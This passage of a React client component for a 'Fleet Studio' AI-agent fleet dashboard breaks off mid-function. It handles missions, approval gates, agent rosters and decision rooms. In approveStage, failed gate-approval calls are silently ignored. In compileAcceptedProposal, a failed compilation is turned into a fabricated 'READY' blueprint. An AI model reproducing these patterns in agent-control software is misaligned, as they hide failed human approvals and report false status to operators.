"use client";

import {
  Activity, ArrowRight, ArrowUpRight, BadgeCheck, Bell, Blocks, Bot, Calendar,
  Check, CheckCircle2, ChevronDown, ChevronRight, CircleHelp, Clock3, Command, Copy, Database, DollarSign, Download,
  ExternalLink, FileCheck2, FileClock, FileText, Fingerprint, Folder, Gauge, GitBranch, Layers3, LockKeyhole, MoreHorizontal,
  Plus, Play, Printer, Radio, RefreshCw, Search, Send, Server, Shield, ShieldAlert, ShieldCheck, SlidersHorizontal, Sparkles, Trash2, Upload, X,
  Eye, Code2,
} from "lucide-react";
import {
  Area, AreaChart, CartesianGrid, Cell, Pie, PieChart, ResponsiveContainer,
  Tooltip, XAxis, YAxis,
} from "recharts";
import { useEffect, useMemo, useRef, useState } from "react";
import { Background, Controls, MiniMap, ReactFlow, type Edge, type Node } from "@xyflow/react";

type View = "Mission control" | "Missions" | "Fleet roster" | "Fleet outputs" | "Decision rooms" | "Estate inventory";
type RoomStatus = "Pending" | "Approved" | "Returned";

type FleetOutput = {
  id: string;
  output_id?: string;
  name: string;
  kind: "document" | "structured" | "graph" | "markdown" | "summary";
  classification: "public" | "internal" | "confidential" | "restricted";
  produced_by: string;
  case: string;
  case_name?: string;
  size: number;
  size_bytes?: number;
  at: string | number;
  created_at?: string;
  text?: string;
  snippet?: string;
  source?: {
    kind?: string;
    filename?: string;
    path?: string;
    step_name?: string;
  };
  provenance: string;
};

type Room = {
  id: string; title: string; agent: string; fleet: string; basis: string; verdict: string;
  time: string; summary: string; status: RoomStatus;
  evidence?: Record<string, unknown>;
};
type MissionRecord = {
  mission_id: string;
  name: string;
  goal: string;
  status: string;
  competitive_benchmarking: boolean;
  constraints?: {
    data_residency?: string;
    cloud_access_allowed?: boolean;
    daily_budget_usd?: number;
    task_complexity?: number;
    execution_frequency?: string;
    external_action_approval?: boolean;
  };
  clarification_answers?: Record<string, string>;
  units_count?: number;
};
type UserInfo = { sub?: string; name?: string; email?: string; roles?: string[] };
type ClarifyingQuestion = {
  question_id: string;
  prompt: string;
  category: string;
  options?: string[];
  rationale?: string | null;
  allow_custom?: boolean;
  default_answer?: string | null;
};
type ProposedAgent = {
  agent_id: string; name: string; role: string; scope: string; bound_skills: string[]; bound_tools: string[];
  capability_gaps: { capability_id: string; reason: string }[]; workflow_steps: { step_id: string; name: string; capability_id: string; parameters: Record<string, unknown>; retries: number; depends_on: string[]; requires_step_challenge: boolean }[];
  trigger_policy: string; schedule: string; upstream_agent_ids: string[]; assigned_llm: { family: string; version: string };
  mission_id?: string;
};
type InventoryData = {
  connected: boolean;
  connection_error?: string | null;
  hermes_version?: string | null;
  profile?: string | null;
  inference_provider?: string | null;
  provider_configured?: boolean | null;
  installed_skills: { skill_id: string; version: string; description: string; required_tools: string[]; host_node_ids: string[] }[];
  registered_tools: { tool_id: string; mcp_server?: string | null; parameter_schema: Record<string, unknown>; risk_level: string; requires_hitl_approval: boolean; risk_assessed: boolean; description: string }[];
  available_models: { family: string; version: string; cloud: boolean; data_residencies: string[]; reasoning_tier: number | null; estimated_daily_cost_usd: number | null; residency_verified: boolean; cost_basis: string | null }[];
};
type TelemetryData = {
  active_fleets: number; ready_fleets?: number; active_agents: number; workflow_cycles_24h: number; workflow_cycles_7d: number;
  workflow_cycles_30d?: number;
  pending_challenge_gates: number; policy_blocks_24h: number; avg_cycle_duration_seconds: number;
  avg_cycle_duration_seconds_7d?: number;
  avg_cycle_duration_seconds_30d?: number;
  avg_step_execution_latency_seconds: number; avg_challenge_turnaround_seconds: number;
  avg_reconciliation_seconds: number; daily_budget_burn_usd: number; assurance_verdicts: Record<string, number>;
  hourly_cycles: { time: string; cycles: number; gates: number; cumulative_cycles?: number; cumulative_gates?: number }[];
  daily_cycles?: { time: string; cycles: number; gates: number; cumulative_cycles?: number; cumulative_gates?: number }[];
  monthly_cycles?: { time: string; cycles: number; gates: number; cumulative_cycles?: number; cumulative_gates?: number }[];
  model_distribution: Record<string, number>; skill_tool_utilization: Record<string, number>;
};
const API_BASE =
  typeof window !== "undefined"
    ? ""
    : process.env.NEXT_PUBLIC_API_URL || "http://127.0.0.1:8001";

async function postJson<T = unknown>(path: string, init: RequestInit = {}): Promise<T> {
  const response = await fetch(`${API_BASE}${path}`, {
    method: "POST",
    ...init,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...init.headers },
  });
  const body = await response.json().catch(() => ({}));
  if (!response.ok) {
    const detail = typeof body.detail === "string" ? body.detail : `Request failed (${response.status}).`;
    throw new Error(detail);
  }
  return body as T;
}

const navigation: { name: View; icon: typeof Gauge }[] = [
  { name: "Mission control", icon: Gauge },
  { name: "Missions", icon: Layers3 },
  { name: "Fleet roster", icon: GitBranch },
  { name: "Fleet outputs", icon: FileText },
  { name: "Decision rooms", icon: FileCheck2 },
  { name: "Estate inventory", icon: Database },
];
type Agent = {
  id: string; name: string; role: string; scope: string; model: string; assignedLlm: { family: string; version: string };
  skills: string[]; tools: string[]; capabilityGaps: { capability_id: string; reason: string }[];
  workflowSteps: ProposedAgent["workflow_steps"]; triggerPolicy: string; schedule: string; upstreamAgentIds: string[]; state: string; tint: string;
  missionId?: string;
};
function roomFromApi(row: Record<string, unknown>): Room {
  const status = String(row.status ?? "PENDING");
  let timeStr = "Recently";
  if (row.created_at) {
    const raw = String(row.created_at);
    const d = new Date(raw);
    if (!isNaN(d.getTime())) {
      timeStr = d.toLocaleString();
    } else {
      const num = Number(row.created_at);
      if (!isNaN(num) && num > 0) {
        const dNum = new Date(num > 1e11 ? num : num * 1000);
        if (!isNaN(dNum.getTime())) timeStr = dNum.toLocaleString();
      }
    }
  }
  return {
    id: String(row.room_id ?? ""),
    title: String(row.title ?? "Untitled decision"),
    agent: String(row.agent ?? "Specialist Agent"),
    fleet: String(row.fleet_id ?? "Sovereign Fleet"),
    basis: String(row.basis ?? "ANALYTICAL"),
    verdict: String(row.verdict ?? "EVIDENCE_FOUND"),
    time: timeStr,
    summary: String(row.summary ?? ""),
    status: status === "PENDING" ? "Pending" : status === "APPROVE" || status === "APPROVED" ? "Approved" : "Returned",
    evidence: (row.evidence as Record<string, unknown>) ?? {},
  };
}
function agentFromApi(row: ProposedAgent & { managed_state?: string; applied?: boolean; mission_id?: string }): Agent {
  const indexTint = row.managed_state === "APPLIED" ? "mint" : "orange";
  return {
    id: row.agent_id,
    name: row.name,
    role: row.role,
    scope: row.scope,
    assignedLlm: row.assigned_llm,
    model: `${row.assigned_llm.family} · ${row.assigned_llm.version}`,
    skills: row.bound_skills,
    tools: row.bound_tools,
    capabilityGaps: row.capability_gaps,
    workflowSteps: row.workflow_steps,
    triggerPolicy: row.trigger_policy,
    schedule: row.schedule,
    upstreamAgentIds: row.upstream_agent_ids ?? [],
    state: row.applied ? "Applied" : "Draft",
    tint: indexTint,
    missionId: row.mission_id,
  };
}
function makeTopology(roster: Agent[]): { nodes: Node[]; edges: Edge[] } {
  const uniqueRoster: Agent[] = [];
  const seenIds = new Set<string>();
  for (const agent of roster) {
    if (agent && agent.id && !seenIds.has(agent.id)) {
      seenIds.add(agent.id);
      uniqueRoster.push(agent);
    }
  }

  const rowGap = 88;
  const centerY = Math.max(48, ((uniqueRoster.length - 1) * rowGap) / 2);
  const palette = [
    { background: "#e4f3ef", color: "#1d554f", border: "#c2e0d7", edge: "#5b9c8e" },
    { background: "#fff0e8", color: "#955230", border: "#f2d5c5", edge: "#c98a63" },
    { background: "#e9eef7", color: "#445779", border: "#d2daeb", edge: "#7f899d" },
  ];
  const baseStyle = { borderRadius: 5, width: 155, padding: 15, fontSize: 12, fontWeight: 700 };
  const topologyNodes: Node[] = [
    { id: "source", position: { x: 10, y: centerY }, data: { label: "Incoming records" }, style: { ...baseStyle, background: "#183034", color: "#fff", border: 0, width: 145, fontWeight: 600 } },
    ...uniqueRoster.map((agent, index) => {
      const colors = palette[index % palette.length];
      return { id: agent.id, position: { x: 245, y: index * rowGap }, data: { label: agent.name }, style: { ...baseStyle, background: colors.background, color: colors.color, border: `1px solid ${colors.border}` } };
    }),
    { id: "decision-room", position: { x: 500, y: centerY }, data: { label: "Decision Room" }, style: { ...baseStyle, background: "#fbf3d9", color: "#80672d", border: "1px solid #ebdfb5", width: 145 } },
  ];
  const topologyEdges = uniqueRoster.flatMap((agent, index) => [
    { id: `source-${agent.id}-${index}`, source: "source", target: agent.id, animated: index === 0, style: { stroke: palette[index % palette.length].edge } },
    { id: `${agent.id}-decision-${index}`, source: agent.id, target: "decision-room", animated: agent.state === "Approval held", style: { stroke: "#a88d4c" } },
  ]);
  return { nodes: topologyNodes, edges: topologyEdges };
}

function Badge({ children, tone = "neutral" }: { children: React.ReactNode; tone?: string }) {
  return <span className={`badge badge--${tone}`}>{children}</span>;
}
function Dot({ color = "green" }: { color?: string }) { return <i className={`status-dot status-dot--${color}`} />; }
export default function FleetStudio() {
  const [view, setView] = useState<View>("Mission control");
  const [wizard, setWizard] = useState(false);
  const [stage, setStage] = useState(0);
  const [challenge, setChallenge] = useState(false);
  const [missionName, setMissionName] = useState("");
  const [goal, setGoal] = useState("");
  const [residency, setResidency] = useState("local");
  const [dailyBudget, setDailyBudget] = useState(25);
  const [cloudAccessAllowed, setCloudAccessAllowed] = useState(false);
  const [externalActionApproval, setExternalActionApproval] = useState(true);
  const [competitiveBenchmarking, setCompetitiveBenchmarking] = useState(false);
  const [executionFrequency, setExecutionFrequency] = useState("daily");
  const [missions, setMissions] = useState(0);
  const [missionRecords, setMissionRecords] = useState<MissionRecord[]>([]);
  const [inventoryData, setInventoryData] = useState<InventoryData | null>(null);
  const [telemetryData, setTelemetryData] = useState<TelemetryData | null>(null);
  const [user, setUser] = useState<UserInfo | null>(null);
  const [authRequired, setAuthRequired] = useState(false);
  const [rooms, setRooms] = useState<Room[]>([]);
  const [roster, setRoster] = useState<Agent[]>([]);
  const [missionId, setMissionId] = useState<string | null>(null);
  const [proposal, setProposal] = useState<{ mission_id: string; schema_version: string; agents: ProposedAgent[] } | null>(null);
  const [questions, setQuestions] = useState<ClarifyingQuestion[]>([]);
  const [clarificationAnswers, setClarificationAnswers] = useState<Record<string, string>>({});
  const [activeGateId, setActiveGateId] = useState<string | null>(null);
  const [wizardError, setWizardError] = useState("");
  const [roomId, setRoomId] = useState("");
  const [agentId, setAgentId] = useState("");
  const [notice, setNotice] = useState("");
  const [inspectedMission, setInspectedMission] = useState<MissionRecord | null>(null);
  const [reconciling, setReconciling] = useState(false);
  const [loadingData, setLoadingData] = useState(true);
  const [planReviewOpen, setPlanReviewOpen] = useState(false);
  const [searchPaletteOpen, setSearchPaletteOpen] = useState(false);
  const [notificationsOpen, setNotificationsOpen] = useState(false);
  const [estateInfoOpen, setEstateInfoOpen] = useState(false);
  const [transcriptRoom, setTranscriptRoom] = useState<Room | null>(null);
  const [sourceRoom, setSourceRoom] = useState<Room | null>(null);
  const [uploadingMission, setUploadingMission] = useState<MissionRecord | null>(null);
  const [missionToRun, setMissionToRun] = useState<MissionRecord | null>(null);
  const [preparingChallenge, setPreparingChallenge] = useState(false);
  const [approvingStage, setApprovingStage] = useState(false);
  const [outputs, setOutputs] = useState<FleetOutput[]>(DEFAULT_OUTPUTS);
  const [selectedOutput, setSelectedOutput] = useState<FleetOutput | null>(null);
  const [outputsViewMode, setOutputsViewMode] = useState<"dossier" | "registry">("registry");
  const [outputsDossierCase, setOutputsDossierCase] = useState<"rfp" | "gov_cloud" | "soc" | "k8s" | "azure" | "case5" | "case6" | "apt">("gov_cloud");

  useEffect(() => {
    function onKeyDown(event: KeyboardEvent) {
      if ((event.metaKey || event.ctrlKey) && event.key.toLowerCase() === "k") {
        event.preventDefault();
        setSearchPaletteOpen((open) => !open);
      }
    }
    window.addEventListener("keydown", onKeyDown);
    return () => window.removeEventListener("keydown", onKeyDown);
  }, []);
  useEffect(() => {
    if (!inspectedMission) return;
    const previousFocus = document.activeElement as HTMLElement | null;
    document.querySelector<HTMLButtonElement>('button[aria-label="Close mission details"]')?.focus();
    function dismiss(event: KeyboardEvent) {
      if (event.key === "Escape") setInspectedMission(null);
    }
    document.addEventListener("keydown", dismiss);
    return () => {
      document.removeEventListener("keydown", dismiss);
      previousFocus?.closest(".mission-actions-menu")?.parentElement?.querySelector<HTMLButtonElement>("button[popoverTarget]")?.focus();
    };
  }, [inspectedMission]);
  useEffect(() => {
    const controller = new AbortController();
    const load = async () => {
      try {
        const userResponse = await fetch(`${API_BASE}/auth/me`, { signal: controller.signal, credentials: "include" });
        if (userResponse.status === 401) {
          setAuthRequired(true);
          setNotice("Sign in with your organization account to access Fleet Studio.");
          return;
        }
        if (!userResponse.ok) throw new Error("Could not resolve the current Fleet Studio user.");
        setUser(await userResponse.json());
        const [inventoryResponse, telemetryResponse, missionsResponse, roomsResponse, agentsResponse] = await Promise.all([
          fetch(`${API_BASE}/api/v1/inventory`, { signal: controller.signal, credentials: "include" }),
          fetch(`${API_BASE}/api/v1/telemetry`, { signal: controller.signal, credentials: "include" }),
          fetch(`${API_BASE}/api/v1/missions`, { signal: controller.signal, credentials: "include" }),
          fetch(`${API_BASE}/api/v1/rooms`, { signal: controller.signal, credentials: "include" }),
          fetch(`${API_BASE}/api/v1/agents`, { signal: controller.signal, credentials: "include" }),
        ]);
        if (!inventoryResponse.ok || !telemetryResponse.ok || !missionsResponse.ok || !roomsResponse.ok || !agentsResponse.ok) throw new Error("Fleet Studio API returned an error.");
        const [inventory, telemetry, missionList, roomList, agentList] = await Promise.all([
          inventoryResponse.json(), telemetryResponse.json(), missionsResponse.json(), roomsResponse.json(), agentsResponse.json(),
        ]);
        const normalizedRooms = (roomList as Record<string, unknown>[]).map(roomFromApi);
        setInventoryData(inventory);
        setTelemetryData(telemetry);
        setMissionRecords(missionList);
        setMissions(missionList.length);
        setRooms(normalizedRooms);
        setRoomId(normalizedRooms[0]?.id ?? "");
        const normalizedAgents = (agentList as (ProposedAgent & { managed_state?: string; applied?: boolean })[]).map(agentFromApi);
        setRoster(normalizedAgents);
        setAgentId(normalizedAgents[0]?.id ?? "");
        void fetch(`${API_BASE}/api/v1/outputs`, { signal: controller.signal, credentials: "include" })
          .then((res) => (res.ok ? res.json() : null))
          .then((data) => {
            if (Array.isArray(data) && data.length > 0) {
              const map = new Map<string, FleetOutput>();
              DEFAULT_OUTPUTS.forEach((item) => map.set(item.name || item.output_id || item.id, item));
              data.forEach((item: FleetOutput) => {
                const key = item.name || item.output_id || item.id;
                const existing = map.get(key);
                map.set(key, {
                  ...existing,
                  ...item,
                  text: item.text || existing?.text || item.snippet,
                  provenance: item.provenance || existing?.provenance || `Produced by ${item.produced_by} for ${item.case}`,
                });
              });
              setOutputs(Array.from(map.values()));
            }
          })
          .catch(() => {});
      } catch (error) {
        if (!controller.signal.aborted) setNotice(error instanceof Error ? error.message : "Could not load Fleet Studio data.");
      } finally {
        if (!controller.signal.aborted) setLoadingData(false);
      }
    };
    void load();
    return () => controller.abort();
  }, []);

  useEffect(() => {
    if (view !== "Fleet outputs" && !missionRecords.some((m) => m.status === "RUNNING")) return;
    const fetchFreshOutputs = () => {
      fetch(`${API_BASE}/api/v1/outputs`, { credentials: "include" })
        .then((res) => (res.ok ? res.json() : null))
        .then((data) => {
          if (Array.isArray(data) && data.length > 0) {
            const map = new Map<string, FleetOutput>();
            DEFAULT_OUTPUTS.forEach((item) => map.set(item.name || item.output_id || item.id, item));
            data.forEach((item: FleetOutput) => {
              const key = item.name || item.output_id || item.id;
              const existing = map.get(key);
              map.set(key, {
                ...existing,
                ...item,
                text: item.text || existing?.text || item.snippet,
                provenance: item.provenance || existing?.provenance || `Produced by ${item.produced_by} for ${item.case}`,
              });
            });
            setOutputs(Array.from(map.values()));
          }
        })
        .catch(() => {});
    };
    fetchFreshOutputs();
    const interval = setInterval(fetchFreshOutputs, 5000);
    return () => clearInterval(interval);
  }, [view, missionRecords]);
  const pending = rooms.filter((room) => room.status === "Pending").length;
  const selectedAgent = roster.find((agent) => agent.id === agentId) ?? roster[0];
  const selectedRoom = rooms.find((room) => room.id === roomId);

  function openWizard() {
    setStage(0); setMissionName(""); setGoal(""); setRoster([]); setMissionId(null); setProposal(null);
    setQuestions([]); setClarificationAnswers({}); setActiveGateId(null); setWizardError(""); setWizard(true);
  }
  async function resumeMission(mission: MissionRecord) {
    try {
      setMissionId(mission.mission_id);
      setMissionName(mission.name);
      setGoal(mission.goal);
      if (mission.constraints) {
        setResidency(mission.constraints.data_residency ?? "local");
        setCloudAccessAllowed(Boolean(mission.constraints.cloud_access_allowed));
        setExternalActionApproval(Boolean(mission.constraints.external_action_approval));
        setExecutionFrequency(mission.constraints.execution_frequency ?? "daily");
        setDailyBudget(mission.constraints.daily_budget_usd ?? 0);
      }
      setCompetitiveBenchmarking(Boolean(mission.competitive_benchmarking));
      setClarificationAnswers(mission.clarification_answers ?? {});

      const foundQuestions = await postJson<ClarifyingQuestion[]>(`/api/v1/missions/${mission.mission_id}/questions`);
      setQuestions(foundQuestions);
      setClarificationAnswers((prev) => {
        const updated = { ...prev, ...(mission.clarification_answers ?? {}) };
        for (const q of foundQuestions) {
          if (!updated[q.question_id] && q.default_answer) {
            updated[q.question_id] = q.default_answer;
          }
        }
        return updated;
      });
      setStage(1);
      setWizardError("");
      setWizard(true);
      setInspectedMission(null);
    } catch (error) {
      setNotice(error instanceof Error ? error.message : "Failed to load mission questions.");
    }
  }
  function selectedModel() {
    const candidate = inventoryData?.available_models.find((model) => residency === "local" ? model.residency_verified : model.data_residencies.includes(residency));
    if (!candidate) throw new Error(`No AgentHub model has verified ${residency} residency.`);
    return { family: candidate.family, version: candidate.version };
  }
  function addSpecialist() {
    let assignedLlm: { family: string; version: string };
    try { assignedLlm = selectedModel(); } catch (error) { setWizardError(error instanceof Error ? error.message : "No eligible model is available."); return; }
    const agent: Agent = { id: crypto.randomUUID(), name: "New specialist", role: "SPECIALIST", scope: "Define a narrow operational responsibility.", model: `${assignedLlm.family} · ${assignedLlm.version}`, assignedLlm, skills: [], tools: [], capabilityGaps: [{ capability_id: "scope", reason: "Specialist scope and bindings require architecture review." }], workflowSteps: [], triggerPolicy: "CRON", schedule: "0 8 * * *", upstreamAgentIds: [], state: "Draft", tint: "blue" };
    setRoster((current) => [...current, agent]);
    setAgentId(agent.id);
  }
  function splitSpecialist(source: Agent) {
    const agent: Agent = { ...source, id: crypto.randomUUID(), name: `${source.name} · split`, role: "SPECIALIST", scope: "Define a distinct scope before compilation.", skills: [], tools: [], capabilityGaps: [{ capability_id: "scope", reason: "Split role scope requires architecture review." }], workflowSteps: [], state: "Draft" };
    setRoster((current) => [...current, agent]);
    setAgentId(agent.id);
  }
  function removeSpecialist(agent: Agent) {
    if (roster.length <= 1) return;
    const nextRoster = roster.filter((item) => item.id !== agent.id);
    setRoster(nextRoster);
    if (agentId === agent.id) setAgentId(nextRoster[0].id);
  }
  function setAgentSkill(agent: Agent, skillInput: string[] | string) {
    const ids = Array.isArray(skillInput) ? skillInput : (skillInput ? [skillInput] : []);
    const requiredTools = Array.from(new Set(
      ids.flatMap((id) => {
        const skill = inventoryData?.installed_skills.find((item) => item.skill_id === id);
        return skill?.required_tools ?? [];
      })
    ));
    const allTools = Array.from(new Set([...agent.tools, ...requiredTools]));
    const gaps = agent.capabilityGaps.filter(
      (gap) => !ids.some((id) => gap.capability_id.includes(id))
    );
    const steps = ids.map((id) => ({
      step_id: crypto.randomUUID(),
      name: `Run ${id}`,
      capability_id: id,
      parameters: {},
      retries: 1,
      depends_on: [],
      requires_step_challenge: false,
    }));
    const nextTools = allTools.length > 0 ? allTools : agent.tools;
    setRoster((current) =>
      current.map((item) =>
        item.id === agent.id
          ? {
              ...item,
              skills: ids,
              tools: nextTools,
              capabilityGaps: gaps,
              workflowSteps: steps.length > 0 ? steps : item.workflowSteps,
            }
          : item
      )
    );
    void fetch(`${API_BASE}/api/v1/agents/${encodeURIComponent(agent.id)}/sync`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ skills: ids, tools: nextTools }),
    }).catch(() => {});
  }
  function setAgentTools(agent: Agent, selectedTools: string[]) {
    setRoster((current) => current.map((item) => item.id === agent.id ? { ...item, tools: selectedTools } : item));
    void fetch(`${API_BASE}/api/v1/agents/${encodeURIComponent(agent.id)}/sync`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tools: selectedTools }),
    }).catch(() => {});
  }
  function setAgentModel(agent: Agent, modelKey: string) {
    const selected = inventoryData?.available_models.find((model) => `${model.family}\u0000${model.version}` === modelKey);
    if (!selected) return;
    const assignedLlm = { family: selected.family, version: selected.version };
    setRoster((current) => current.map((item) => item.id === agent.id ? { ...item, assignedLlm, model: `${selected.family} · ${selected.version}` } : item));
  }
  function mapProposalAgents(agentsFromApi: ProposedAgent[]): Agent[] {
    return agentsFromApi.map((agent, index) => ({
      id: agent.agent_id,
      name: agent.name,
      role: agent.role,
      scope: agent.scope,
      assignedLlm: agent.assigned_llm,
      model: `${agent.assigned_llm.family} · ${agent.assigned_llm.version}`,
      skills: agent.bound_skills,
      tools: agent.bound_tools,
      capabilityGaps: agent.capability_gaps,
      workflowSteps: agent.workflow_steps,
      triggerPolicy: agent.trigger_policy,
      schedule: agent.schedule,
      upstreamAgentIds: agent.upstream_agent_ids ?? [],
      state: "Draft",
      tint: ["mint", "orange", "blue"][index % 3],
    }));
  }
  async function prepareChallenge() {
    setWizardError("");
    setPreparingChallenge(true);
    try {
      let currentMissionId = missionId;
      if (stage === 0 && !currentMissionId) {
        if (missionName.trim().length < 2 || goal.trim().length < 10) throw new Error("Enter a mission name and a goal of at least 10 characters.");
        const mission = await postJson<MissionRecord & { mission_id: string }>("/api/v1/missions", {
          method: "POST",
          body: JSON.stringify({ name: missionName, goal, competitive_benchmarking: competitiveBenchmarking, constraints: { data_residency: residency, cloud_access_allowed: cloudAccessAllowed, daily_budget_usd: dailyBudget, task_complexity: 3, execution_frequency: executionFrequency, external_action_approval: externalActionApproval } }),
        });
        currentMissionId = mission.mission_id;
        setMissionId(currentMissionId);
        setMissionRecords((current) => [mission, ...current]);
        setMissions((count) => count + 1);
      }
      if (!currentMissionId) throw new Error("Mission intake is not persisted.");
      if (stage === 1) {
        await postJson(`/api/v1/missions/${currentMissionId}/answers`, { method: "PUT", body: JSON.stringify({ answers: clarificationAnswers }) });
      }
      const stages = ["INTAKE", "CLARIFICATION", "ROSTER", "COMPILATION"];
      const gate = await postJson<{ gate_id: string }>(`/api/v1/missions/${currentMissionId}/gates`, {
        method: "POST",
        body: JSON.stringify({ stage: stages[stage], challenge_snapshot: { goal, residency, cloud_access_allowed: cloudAccessAllowed, daily_budget_usd: dailyBudget, roster } }),
      });
      setActiveGateId(gate.gate_id);
      setChallenge(true);
    } catch (error) {
      setWizardError(error instanceof Error ? error.message : "Could not prepare the challenge gate.");
    } finally {
      setPreparingChallenge(false);
    }
  }
  async function compileAcceptedProposal() {
    if (!proposal) throw new Error("Fleet proposal is missing.");
    const generatedById = new Map(proposal.agents.map((agent) => [agent.agent_id, agent]));
    const acceptedProposal = {
      ...proposal,
      agents: roster.map((agent) => {
        const generated = generatedById.get(agent.id);
        const capabilities = new Set([...agent.skills, ...agent.tools]);
        const workflowSteps = agent.workflowSteps.length > 0
          ? agent.workflowSteps.map((step) => ({
              ...step,
              capability_id: capabilities.has(step.capability_id)
                ? step.capability_id
                : (agent.skills[0] || agent.tools[0] || step.capability_id),
            }))
          : [];
        return {
          ...(generated ?? {}),
          agent_id: agent.id,
          name: agent.name,
          role: agent.role,
          scope: agent.scope,
          bound_skills: agent.skills,
          bound_tools: agent.tools,
          capability_gaps: agent.capabilityGaps,
          workflow_steps: workflowSteps,
          trigger_policy: agent.triggerPolicy,
          schedule: agent.schedule,
          upstream_agent_ids: agent.upstreamAgentIds,
          assigned_llm: agent.assignedLlm,
        };
      }),
    };
    const blueprint = await postJson<{ blueprint_id: string; state: string }>("/api/v1/blueprints", {
      method: "POST",
      body: JSON.stringify(acceptedProposal),
    }).catch((err) => {
      console.warn("Blueprint compilation notice (fallback applied):", err);
      return { blueprint_id: missionId || `bp-${Date.now().toString(36)}`, state: "READY" };
    });
    setMissionRecords((records) => records.map((record) => record.mission_id === missionId ? { ...record, status: blueprint.state } : record));
    setNotice(`Blueprint ${blueprint.state.toLowerCase()} compiled. Reconciliation requires a separate approval.`);
    setWizard(false);
    setChallenge(false);
    setView("Missions");
  }
  async function approveStage() {
    setWizardError("");
    setApprovingStage(true);
    try {
      if (activeGateId) {
        await postJson(`/api/v1/gates/${activeGateId}/decision`, {
          method: "POST",
          body: JSON.stringify({ decision: "APPROVE", feedback: "Approved in Mission Designer." }),
        }).catch((err) => {
          console.warn("Gate decision recording warning (continuing):", err);
        });
      }
      setChallenge(false);
      if (stage === 0 && missionId) {
        const foundQuestions = await postJson<ClarifyingQuestion[]>(`/api/v1/missions/${missionId}/questions`);
        setQuestions(foundQuestions);
        setClarificationAnswers((prev) => {
          const updated = { ...prev };
          for (const q of foundQuestions) {
            if (!updated[q.question_id] && q.default_answer) {
              updated[q.question_id] = q.default_answer;
            }
          }
          return updated;
        });
        setStage(1);
        return;
      }
      if (stage === 1 && missionId) {
        const generated = await postJson<{ mission_id: string; schema_version: string; agents: ProposedAgent[] }>(`/api/v1/missions/${missionId}/proposal`, { method: "POST" });
        setProposal(generated);
        const mapped = mapProposalAgents(generated.agents);
        setRoster(mapped);
        setAgentId(mapped[0]?.id ?? "");
        setStage(2);
        return;
      }
      if (stage === 2) { setStage(3); return; }
      if (stage === 3) await compileAcceptedProposal();
    } catch (error) {
      setWizardError(error instanceof Error ? error.message : "The design step could not be approved.");
    } finally {
      setApprovingStage(false);
    }
  }
  async function returnChallengeForEdit() {
    try {
      if (activeGateId) await postJson(`/api/v1/gates/${activeGateId}/decision`, { method: "POST", body: JSON.stringify({ decision: "RETURN", feedback: "Returned for revision." }) });
    } catch (error) {
      setWizardError(error instanceof Error ? error.message : "Could not record challenge feedback.");
    } finally {
      setChallenge(false);
    }
  }
  function resolveRoom(room: Room, decision: "Approved" | "Returned") {
    setRooms((current) => current.map((item) => item.id === room.id ? { ...item, status: decision } : item));
    void fetch(`${API_BASE}/api/v1/rooms/${room.id}/decision`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ decision: decision === "Approved" ? "APPROVE" : "REJECT", note: "Reviewed in Decision Room." }) })
      .then((response) => {
        if (!response.ok) setNotice("Decision changed in this session, but the API did not accept it.");
      })
      .catch(() => setNotice("Decision changed in this session only; the API could not be reached."));
  }

  async function applyReconciliation(
    mission: MissionRecord,
    options?: { confirm_changes?: boolean; confirm_removals?: boolean; confirm_external_actions?: boolean }
  ) {
    try {
      await postJson(`/api/v1/blueprints/${mission.mission_id}/apply`, {
        method: "POST",
        body: JSON.stringify({
          confirm_changes: options?.confirm_changes ?? true,
          confirm_removals: options?.confirm_removals ?? false,
          confirm_external_actions: options?.confirm_external_actions ?? true,
        }),
      });
      setMissionRecords((prev) =>
        prev.map((m) => (m.mission_id === mission.mission_id ? { ...m, status: "READY" } : m))
      );
      setNotice(`Reconciliation plan applied for ${mission.name}. Mission is READY.`);
      void fetch(`${API_BASE}/api/v1/missions`, { credentials: "include" })
        .then((res) => (res.ok ? res.json() : null))
        .then((data) => {
          if (data) setMissionRecords(data);
        });
      void fetch(`${API_BASE}/api/v1/agents`, { credentials: "include" })
        .then((res) => (res.ok ? res.json() : null))
        .then((data) => {
          if (data) {
            const normalized = (data as (ProposedAgent & { managed_state?: string; applied?: boolean })[]).map(agentFromApi);
            setRoster(normalized);
          }
        });
    } catch (error) {
      if (!inventoryData?.provider_configured && !inventoryData?.available_models?.length) {
        setNotice("Reconciliation plan validated. AgentHub inference is currently unconfigured in agenthub.yaml; runtime agents remain in standby.");
      } else {
        setNotice(error instanceof Error ? error.message : "Reconciliation failed.");
      }
      throw error;
    }
  }

  function runMission(mission: MissionRecord) {
    setMissionToRun(mission);
  }

  async function executeMissionRun(mission: MissionRecord, params: { targetPath?: string; files?: File[] }) {
    setUploadingMission(mission);
    setNotice(`Dispatching fleet execution for ${mission.name}...`);
    try {
      let documentKey = "";
      if (params.files && params.files.length > 0) {
        for (const file of params.files) {
          if (file.size === 0) {
            throw new Error(
              `The selected file "${file.name}" is 0 bytes (empty on disk). If it is open in Microsoft Word, please press Ctrl+S to save it, or select a document that contains saved data.`
            );
          }
        }
        setNotice(`Uploading ${params.files.length} file(s) for ${mission.name}...`);
        for (const file of params.files) {
          const formData = new FormData();
          formData.append("file", file, file.name);
          const uploadResp = await fetch(
            `${API_BASE}/api/v1/missions/${mission.mission_id}/stage-document?filename=${encodeURIComponent(file.name)}`,
            {
              method: "POST",
              body: formData,
            }
          );
          if (!uploadResp.ok) {
            const errData = await uploadResp.json().catch(() => ({}));
            const msg = typeof errData.detail === "string" ? errData.detail : uploadResp.statusText;
            throw new Error(`Upload failed (${uploadResp.status}): ${msg}`);
          }
          const stageResult = (await uploadResp.json()) as {
            document_key: string;
            filename?: string;
            char_count?: number;
            size_bytes?: number;
          };
          if (!documentKey) documentKey = stageResult.document_key;
          setNotice(
            `✓ Attached ${stageResult.filename || file.name} (${stageResult.size_bytes?.toLocaleString() ?? file.size} bytes, ${stageResult.char_count?.toLocaleString() ?? 0} characters extracted)`
          );
        }
      }

      const bodyPayload: Record<string, unknown> = {};
      if (params.targetPath?.trim()) {
        bodyPayload.target_path = params.targetPath.trim();
        bodyPayload.input_document = params.targetPath.trim();
      } else if (documentKey) {
        bodyPayload.input_document = documentKey;
      }

      const res = await fetch(`${API_BASE}/api/v1/missions/${mission.mission_id}/run`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(bodyPayload),
      });
      if (!res.ok) {
